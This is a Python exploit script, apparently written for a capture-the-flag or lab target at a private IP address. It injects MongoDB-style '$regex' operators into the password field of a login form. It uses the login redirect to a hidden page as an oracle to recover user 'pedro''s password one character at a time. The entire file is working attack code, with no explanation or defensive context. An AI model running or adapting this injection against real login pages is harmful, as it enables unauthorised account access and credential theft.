#!/usr/bin/env python3
import sys
import time

import requests
from requests_toolbelt.utils import dump

# ====== Configure here ======
URL = "http://10.201.125.19/login.php"
USER = "pedro"
LENGTH = 11
ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_!@#$%^&*()-=+[];:',.<>?/\\|`~\""

# Success by final URL suffix (redirect target). Must be set.
SUCCESS_URL_SUFFIX = "/sekr3tPl4ce.php"

# Networking/timeouts
TIMEOUT = 10.0  # seconds per request
SLEEP_BETWEEN = 0.0  # seconds between requests
# ===========================


def make_session() -> requests.Session:
    s = requests.Session()
    return s


def is_success(resp: requests.Response) -> bool:
    """
    Determine success by checking the final URL after following redirects.
    For a 302 Location: /sekr3tPl4ce.php, requests will follow it (allow_redirects=True)
    and resp.url will be .../sekr3tPl4ce.php.
    """
    if SUCCESS_URL_SUFFIX:
        if resp.url.endswith(SUCCESS_URL_SUFFIX) or SUCCESS_URL_SUFFIX in resp.url:
            return True
    return False


def main() -> None:
    session = make_session()

    # Preflight to get cookies/session if needed
    try:
        session.get(URL, timeout=TIMEOUT, allow_redirects=True)
    except requests.RequestException:
        pass

    prefix = ""
    for pos in range(1, LENGTH + 1):
        found = False
        for ch in ALPHABET:
            rx = f"^{prefix}{ch}.*$"
            data = {
                "user": USER,
                "pass[$regex]": rx,
                "remember": "on",
            }
            try:
                resp = session.post(
                    URL, data=data, allow_redirects=True, timeout=TIMEOUT
                )
                # dump_bytes = dump.dump_all()
                print(data)
                print(resp.headers)
                print(resp.url)
            except requests.RequestException as e:
                print(
                    f"[!] Request error at position {pos} with '{ch}': {e}",
                    file=sys.stderr,
                )
                sys.exit(1)

            if is_success(resp):
                prefix += ch
                print(f"[+] Position {pos}: {ch} -> {prefix}", flush=True)
                found = True
                break

            if SLEEP_BETWEEN > 0:
                time.sleep(SLEEP_BETWEEN)

        if not found:
            print(f"[-] No digit matched at position {pos}.", file=sys.stderr)
            print("    - Verify SUCCESS_URL_SUFFIX", file=sys.stderr)
            print(
                "    - Confirm operator injection works (e.g., try ^.*$ once)",
                file=sys.stderr,
            )
            sys.exit(1)

    print(f"[*] Done. Password for {USER}: {prefix}")


if __name__ == "__main__":
    main()
